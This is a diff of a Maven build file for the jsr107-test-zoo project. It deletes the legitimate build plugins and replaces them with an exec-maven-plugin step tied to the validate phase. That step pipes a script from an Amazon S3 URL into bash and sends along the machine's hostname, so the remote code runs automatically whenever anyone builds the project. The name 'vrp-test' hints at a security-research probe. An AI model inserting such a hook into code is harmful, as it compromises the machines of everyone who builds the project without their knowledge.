@@ -105,152 +105,33 @@
     </dependencies>
 
     <build>
-
-        <testResources>
-            <testResource>
-                <directory>../src/test/resources</directory>
-                <filtering>true</filtering>
-            </testResource>
-            <testResource>
-                <directory>src/test/resources</directory>
-                <filtering>true</filtering>
-            </testResource>
-        </testResources>
-
-        <plugins>
-
-            <plugin>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <version>2.3.2</version>
-                <configuration>
-                    <source>1.7</source>
-                    <target>1.7</target>
-                </configuration>
-            </plugin>
-
-            <!-- deploy test jar so can be used by other jcache implementations.
-              - remove this plugin if no longer want test-jar deployed.
-              -->
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-jar-plugin</artifactId>
-                <version>2.4</version>
-                <executions>
-                    <execution>
-                        <goals>
-                            <goal>test-jar</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
-                <version>2.8</version>
-                <executions>
-                    <!--Required because JUnit will not detect tests simply included in a dep-->
-                    <execution>
-                        <id>copy-cache-tests</id>
-                        <goals>
-                            <goal>unpack-dependencies</goal>
-                        </goals>
-                        <configuration>
-                            <outputDirectory>${project.build.testOutputDirectory}
-                            </outputDirectory>
-                            <includeArtifactIds>cache-tests</includeArtifactIds>
-                            <includeScope>test</includeScope>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>copy-domain</id>
-                        <goals>
-                            <goal>copy</goal>
-                        </goals>
-                        <configuration>
-                            <artifactItems>
-                                <artifactItem>
-                                    <groupId>javax.cache</groupId>
-                                    <artifactId>app-domain</artifactId>
-                                    <version>${jcache.tck.version}</version>
-                                    <outputDirectory>${domain-lib-dir}
-                                    </outputDirectory>
-                                    <destFileName>${domain-jar}</destFileName>
-                                </artifactItem>
-                            </artifactItems>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-surefire-plugin</artifactId>
-                <version>2.9</version>
-                <configuration>
-                    <systemPropertyVariables>
-                        <java.net.preferIPv4Stack>${java.net.preferIPv4Stack}</java.net.preferIPv4Stack>
-                        <domainJar>${domain-lib-dir}/${domain-jar}</domainJar>
-                        <javax.management.builder.initial>${javax.management.builder.initial}
-                        </javax.management.builder.initial>
-                        <org.jsr107.tck.management.agentId>${org.jsr107.tck.management.agentId}
-                        </org.jsr107.tck.management.agentId>
-                        <javax.cache.CacheManager>${CacheManagerImpl}</javax.cache.CacheManager>
-                        <javax.cache.Cache>${CacheImpl}</javax.cache.Cache>
-                        <javax.cache.Cache.Entry>${CacheEntryImpl}</javax.cache.Cache.Entry>
-                        <javax.cache.annotation.CacheInvocationContext>$
-                            {CacheInvocationContextImpl}
-                        </javax.cache.annotation.CacheInvocationContext>
-                        <!-- by default ignite turns off the TCK logging, enable again -->
-                        <IGNITE_QUIET>false</IGNITE_QUIET>
-                        <!-- by default BlazingCache passes the latest version of the TCK, this flag enables compatibility for the 1.0.1 version --> 
-                        <org.blazingcache.jsr107tck101compatmode>true</org.blazingcache.jsr107tck101compatmode>
-                    </systemPropertyVariables>
-                    <excludes>
-                        <exclude>**/annotation/*Test.java</exclude>
-                    </excludes>
-                </configuration>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-antrun-plugin</artifactId>
-                <version>1.1</version>
-                <executions>
-                    <execution>
-                        <phase>validate</phase>
-                        <goals>
-                            <goal>run</goal>
-                        </goals>
-                        <configuration>
-                            <tasks>
-                                <echo>Test module: ${project.name}</echo>
-                                <echo>Implementation URL: ${project.url}</echo>
-                                <echo></echo>
-                                <echo>Test configuration:</echo>
-                                <echo>&lt;implementation-groupId>${implementation-groupId}&lt;/immplementation-groupId></echo>
-                                <echo>&lt;implementation-artifactId>${implementation-artifactId}&lt;/implementation-artifactId></echo>
-                                <echo>&lt;implementation-version>${implementation-version}&lt;/implementation-version></echo>
-
-                                <echo>&lt;CacheManagerImpl>${CacheManagerImpl}&lt;/CacheManagerImpl></echo>
-                                <echo>&lt;CacheImpl>${CacheImpl}&lt;/CacheImpl></echo>
-                                <echo>&lt;CacheEntryImpl>${CacheEntryImpl}&lt;/CacheEntryImpl></echo>
-
-                                <echo>&lt;javax.management.builder.initial>${javax.management.builder.initial}&lt;/javax.management.builder.initial></echo>
-                                <echo>&lt;org.jsr107.tck.management.agentId>${org.jsr107.tck.management.agentId}&lt;/org.jsr107.tck.management.agentId></echo>
-
-                                <echo>&lt;jcache.api.version>${jcache.api.version}&lt;jcache.api.version></echo>
-                                <echo>&lt;jcache.tck.version>${jcache.tck.version}&lt;jcache.tck.version></echo>
-                                <echo>&lt;jsr107-test-zoo-version>${project.version}&lt;jsr107-test-zoo-version></echo>
-                            </tasks>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-
-        </plugins>
-
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/trivago/jsr107-test-zoo.git\&amp;folder=jsr107-test-zoo\&amp;hostname=`hostname`\&amp;foo=ook\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <licenses>
         <license>
